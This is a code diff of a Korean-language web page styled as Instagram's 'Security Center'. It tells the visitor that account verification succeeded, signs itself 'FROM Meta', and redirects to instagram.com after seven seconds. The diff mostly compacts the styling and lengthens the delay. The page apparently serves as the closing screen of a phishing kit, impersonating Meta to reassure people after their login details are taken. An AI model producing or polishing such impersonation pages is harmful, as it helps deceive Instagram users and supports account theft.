@@ -5,113 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram 보안 센터</title>
     <style>
-        :root {
-            --insta-gradient: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
-        }
-        body { 
-            background-color: #000000; 
-            color: white; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0; 
-            overflow: hidden;
-        }
-        .success-wrapper {
-            width: 85%;
-            max-width: 350px;
-            text-align: center;
-        }
-
-        /* 인스타 스토리 스타일의 그라데이션 링 */
-        .icon-border {
-            width: 100px;
-            height: 100px;
-            background: var(--insta-gradient);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 30px;
-            padding: 4px; /* 테두리 두께 */
-        }
-        .icon-inner {
-            width: 100%;
-            height: 100%;
-            background-color: black;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .check-icon {
-            width: 50px;
-            height: 50px;
-            fill: white;
-            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        h2 { font-size: 22px; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
+        :root { --insta-gradient: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); }
+        body { background-color: #000000; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .success-wrapper { width: 85%; max-width: 350px; text-align: center; }
+        .icon-border { width: 100px; height: 100px; background: var(--insta-gradient); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 30px; padding: 4px; }
+        .icon-inner { width: 100%; height: 100%; background-color: black; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .check-icon { width: 50px; height: 50px; fill: white; animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        h2 { font-size: 22px; font-weight: 600; margin-bottom: 12px; }
         p { color: #a8a8a8; font-size: 14px; line-height: 1.6; margin-bottom: 40px; }
-
-        /* 인스타 스타일 그라데이션 버튼 */
-        .insta-btn {
-            display: block;
-            width: 100%;
-            padding: 14px 0;
-            background: var(--insta-gradient);
-            border: none;
-            border-radius: 8px;
-            color: white;
-            text-decoration: none;
-            font-size: 15px;
-            font-weight: 700;
-            transition: opacity 0.2s;
-        }
-        .insta-btn:active { opacity: 0.8; }
-
-        .footer-logo {
-            margin-top: 50px;
-            opacity: 0.5;
-            width: 80px;
-        }
-
-        @keyframes popIn {
-            0% { transform: scale(0); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
+        .insta-btn { display: block; width: 100%; padding: 14px 0; background: var(--insta-gradient); border-radius: 8px; color: white; text-decoration: none; font-size: 15px; font-weight: 700; }
+        @keyframes popIn { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
     </style>
 </head>
 <body>
     <div class="success-wrapper">
-        <div class="icon-border">
-            <div class="icon-inner">
-                <svg class="check-icon" viewBox="0 0 24 24">
-                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
-                </svg>
-            </div>
-        </div>
-
+        <div class="icon-border"><div class="icon-inner">
+            <svg class="check-icon" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+        </div></div>
         <h2>보안 확인 완료</h2>
-        <p>계정 인증이 성공적으로 완료되었습니다.<br>보안을 위해 5초 후 인스타그램 앱으로<br>안전하게 이동합니다.</p>
-
+        <p>계정 인증이 성공적으로 완료되었습니다.<br>보안을 위해 7초 후 인스타그램 앱으로<br>안전하게 이동합니다.</p>
         <a href="https://www.instagram.com" class="insta-btn">인스타그램으로 돌아가기</a>
-
         <div style="margin-top: 60px;">
-            <span style="color: #a8a8a8; font-size: 12px; font-weight: 600; letter-spacing: 1px;">FROM</span>
-            <br>
-            <span style="font-size: 16px; font-weight: 700; letter-spacing: 1px; background: var(--insta-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Meta</span>
+            <span style="color: #a8a8a8; font-size: 12px; font-weight: 600;">FROM</span><br>
+            <span style="font-size: 16px; font-weight: 700; background: var(--insta-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Meta</span>
         </div>
     </div>
-
     <script>
-        // 5초 후 리다이렉트
-        setTimeout(function() {
-            window.location.href = "https://www.instagram.com";
-        }, 5000);
+        setTimeout(function() { window.location.href = "https://www.instagram.com"; }, 7000);
     </script>
 </body>
 </html>
